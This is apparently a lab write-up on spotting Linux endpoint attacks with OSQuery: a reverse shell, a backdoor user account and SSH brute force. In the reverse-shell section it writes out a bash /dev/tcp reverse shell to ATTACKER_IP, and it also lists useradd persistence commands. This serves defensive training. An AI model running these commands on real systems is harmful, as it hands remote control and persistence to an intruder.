User Activity Monitoring using OSQuery


Project Overview-


This project demonstrates how to detect suspicious activity on a Linux endpoint using OSQuery.

In this lab environment:
Kali Linux is used as the attacker machine

Ubuntu Linux is used as the victim machine

OSQuery is installed on the victim system to monitor system activity

Different attack scenarios are simulated from the attacker machine. The victim system is monitored using OSQuery to detect suspicious activities such as reverse shell connections, unauthorized user creation, and SSH brute-force attacks.

This project shows how SOC analysts investigate endpoint security incidents using OSQuery queries.

Project Objectives-

The main goals of this project are:

Simulate cyber attacks in a controlled lab environment

Monitor endpoint activities using OSQuery

Detect suspicious processes and network connections

Identify unauthorized changes on the system

Investigate Indicators of Compromise (IOCs)

Improve practical SOC investigation skills

Lab Architecture-

Attacker Machine

(Kali Linux)
      |
      |  Attack Traffic
      |

Victim Machine


(Ubuntu + OSQuery)
      |
      |  Endpoint Monitoring
      |

Security Analyst
(OSQuery Queries)

Components-

Attacker Machine
Kali Linux system used to perform attacks.

Victim Machine
Ubuntu Linux system with OSQuery installed.

Security Analyst
Investigates suspicious activity using OSQuery queries.

Tools Used-

OSQuery – Endpoint monitoring and investigation

Kali Linux – Attack simulation

Ubuntu Linux – Victim system

Linux Logs – Security investigation

Attacks Simulated-

1. Reverse Shell Attack-
   
A reverse shell allows the attacker to control the victim system remotely.

Example reverse shell command used by attacker:

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Detection Focus-

Suspicious processes

Unusual network connections

OSQuery Detection Query-

SELECT pid,name,cmdline 

FROM processes

WHERE cmdline LIKE '%/dev/tcp%';

This query helps identify processes that may be used for reverse shell connections.

2. Reverse Shell with Unauthorized User Creation-
   
After gaining access through a reverse shell, the attacker creates a new user account to maintain persistence.

Example commands used by attacker:

useradd hacker

passwd hacker

Detection Query-

SELECT * FROM users;

Security analysts can check if any new or suspicious user accounts are created.

3. SSH Brute Force Attack-
   
In this attack, the attacker tries multiple passwords to log into the system through SSH.

Detection Focus-

Multiple login failures

Suspicious login attempts

Investigation Query-

SELECT * FROM last;

Analysts can also review authentication logs to detect repeated login failures.

Investigation Process-

Security analysts follow these steps during investigation:

Monitor system processes using OSQuery

Check network connections for suspicious activity

Identify newly created users on the system

Analyze login attempts and authentication logs

Look for indicators of compromise (IOCs)


Indicators of Compromise (IOCs)-


Indicator	                                 Description



Unknown network connection	               Possible reverse shel


New user account	                           Persistence attempt


Multiple SSH login failures	               Possible brute force attack


Suspicious processes                         Possible attacker tools


Project Results-

Using OSQuery, the following suspicious activities were detected:

Reverse shell process running on the system

Unauthorized user account created by attacker

Multiple failed SSH login attempts

Suspicious command activity

These detections show how OSQuery can help SOC analysts identify and investigate endpoint attacks.

Learning Outcomes-

Through this project, I learned:

How attackers gain access to Linux systems

How reverse shells work

How to detect suspicious activities using OSQuery

How SOC analysts investigate endpoint security incidents

Importance of endpoint monitoring in cybersecurity

Future Improvements-

Possible improvements for this project:

Add automated alerts using SIEM tools

Integrate Wazuh or Splunk for log monitoring

Monitor file integrity changes

Create automated OSQuery detection rules

